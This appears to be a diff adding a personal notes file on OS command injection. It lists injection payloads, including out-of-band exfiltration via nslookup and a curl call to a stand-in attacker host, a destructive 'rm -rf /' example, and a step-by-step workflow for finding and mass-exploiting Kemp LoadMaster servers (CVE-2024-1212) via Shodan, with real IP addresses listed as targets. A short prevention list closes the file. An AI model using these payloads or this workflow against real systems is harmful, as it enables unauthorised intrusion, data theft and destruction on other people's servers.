@@ -1,0 +1,97 @@
+csrf=GK6RtPkm4YC2K9ZWsZiF3iuwEbBRjtL6&name=tushar&email=tushar%40gmail.com ||ping -c 20 127.0.0.1 ||&subject=hindi&message=math
+
+OS command injection, simple case
+|whoami
+
+Blind OS command injection with time delays
+email=x||ping+-c+10+127.0.0.1||
+
+Blind OS command injection with output redirection
+email=||whoami>/var/www/images/output.txt||
+filename=output.txt
+
+Blind OS command injection with out-of-band interaction
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+
+
+Blind OS command injection with out-of-band data exfiltration
+email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+
+
+
+https://medium.com/@bdemir/a-pentesters-guide-to-command-injection-df2657c8c1ad
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+https://github.com/commixproject/commix (tool)
+
+
+STEP 1: Shodan Search
+query "html: "LoadMaster"
+https://194.21.39.120/
+https://196.216.167.16
+https://36.93.245.110
+https://58.26.202.10
+https://87.190.60.162
+
+STEP 2: Extract domains using Shodan
+save ips in targets.txt
+
+STEP 3: Clone the repo
+---> https://github.com/Chocapikk/CVE-2024-1212
+---> cd CVE-2024-1212
+---> pip install -r requirements.txt
+python3 -m venv venv
+source venv/bin/activate
+
+STEP 3: Scan using Nuclei
+---> nuclei -l targets.txt -t /home/rohit/.local/nuclei-templates/http/cves/2024/CVE-2024-1212.yaml
+
+STEP 4: after found this is vulnerable
+1.To Exploit Single URL
+
+---> python exploit.py --url "http://target-url.com"
+2. To Scan Multiple URLS
+
+---> python exploit.py -f targets.txt -o vulnerable.txt -t 50 --> to scan all files
+STEP 5: Conclusion
+---> CVE-2024-1212 Command Injection Exploit for Kemp LoadMaster has been successfully exploited
+
+#1. Blind Command Injection
+Description: The application does not return the output of the injected command. The attacker must infer success or failure from indirect indicators (like timing or error codes).
+http://example.com/ping?host=127.0.0.1; sleep 10
+If the server delays 10 seconds, the attacker knows the injection succeeded.
+
+#2. Classic (Direct) Command Injection
+Description: The application directly includes unsanitized input in a system command and returns the output.
+http://example.com/ping?host=127.0.0.1; ls -la
+The attacker sees the output of ls -la in the HTTP response.
+
+#3. Out-of-Band (OOB) Command Injection
+Description: The attacker uses external servers to receive the results of their injected command (e.g., DNS, HTTP callbacks).
+; curl http://attacker.com/`whoami`
+The command result is sent to the attacker's server.
+
+#4. Time-Based Command Injection
+Description: A subset of blind injection that relies on time delays to infer behavior.
+; sleep 5
+If the response is delayed by 5 seconds, it indicates the command ran.
+
+#5. File-Based Injection
+Description: Output of a command is written to a file which can then be accessed to verify execution.
+; whoami > /tmp/output.txt
+The attacker accesses /tmp/output.txt to read the result.
+
+#6. Chained Command Injection
+Description: Multiple commands are chained together using operators like ;, &&, ||, etc.
+userinput=127.0.0.1 && rm -rf /
+
+#7. Argument Injection
+Description: Malicious arguments are injected into the command-line arguments passed to system-level commands.
+userinput="--delete-all"
+system("backup-tool " + userinput)
+
+#How to Prevent Command Injection
+Avoid calling shell commands with user input.
+Use language-native APIs instead of shell calls.
+Sanitize and validate all input.
+Use parameterized calls (where applicable).
+Run apps with the least privilege.
